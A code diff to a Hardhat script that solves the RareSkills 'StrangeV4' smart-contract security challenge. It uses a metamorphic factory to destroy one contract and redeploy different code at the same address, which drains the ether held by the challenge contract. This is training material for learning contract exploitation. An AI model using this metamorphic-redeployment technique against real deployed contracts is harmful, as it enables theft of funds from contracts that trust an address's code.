@@ -1,3 +1,10 @@
+/**
+ * @notice This code solves the Rareskills.io "StrangeV4" challenge. It leverages the contracts under `./contracts/` to do this.
+ * We leverage the foundation created by `0age` in terms of leveraging his fantastic Metamorphic Factory contracts.
+ * We use specifically this part: https://github.com/0age/metamorphic#deploymetamorphiccontractfromexistingimplementation
+ * Note: We copied the factory code lcoally under `./contracts/MetamorphicContractFactory.sol`.
+ * @author: Jesper Kristensen
+ */
 const hre = require("hardhat");
 const { expect } = require("chai");
 
@@ -16,6 +23,7 @@ async function main() {
 
   // Now deploy the challenge contract from Rareskills:
   const Challenge = await hre.ethers.getContractFactory("StrangeV4");
+  // when creating the challenge we need to send 1 ether to the challenge contract:
   const challenge = await Challenge.deploy({value: hre.ethers.utils.parseEther("1")});
   console.log("✅ Challenge deployed to: ", challenge.address);
 
@@ -65,8 +73,8 @@ async function main() {
   // Requirement 1: Well we will pass this when we call `success` because ContractOne at `firstAddress` is a contract
   // Requirement 2: We pass this too, since of course when calling `success` with `firstAddress`, it will be the same address as we stored when we called `initialize`
   // Requirement 3: BUT: The contract at `firstAddress` is of course the exact same code hash as the one used during `initialize`.
-  // ... so to solve the challenge, we need to deploy another contract (in our case: Contract Two) with *the same address*
-  // doing that now:
+  // ... so to solve the challenge, we need to deploy another contract (in our case we just pick `ContractTwo` of course) with *the same address*
+  // Doing that now:
 
   // first ... kill the existing deployed ContractOne:
   receipt = await contractOne.kill();
@@ -84,8 +92,9 @@ async function main() {
   console.log("✅ Contract Two deployed to: ", c2.address);
   // contract two is "x+2" (instead of "x+1")
 
+  // see the full documentation here: https://github.com/0age/metamorphic#deploymetamorphiccontractfromexistingimplementation
   receipt = await mmf.deployMetamorphicContractFromExistingImplementation(
-    salt, // use same salt
+    salt, // using the same salt ensures that the metamorphic factory deploys c2 to the same address as c1 was deployed to!
     c2.address, // we reference the already deployed Contract Two instance here - note: this is NOT contract one!
     "0x"
   )
@@ -100,7 +109,10 @@ async function main() {
   console.log("✅ Metamorphosis successful - contract two has same address as contract one - but a different code hash!");
   
   // now solve the challenge!
+  const balBefore = await hre.ethers.provider.getBalance(deployer.address);
   await expect(challenge.success(firstAddress)).not.to.be.reverted;
+  // make sure we receive the funds that are sitting in the contract:
+  expect(await hre.ethers.provider.getBalance(deployer.address)).to.be.greaterThan(balBefore);
   console.log("\n🎉🎉🎉 Challenge solved! 🎉🎉🎉\n");
 }
 
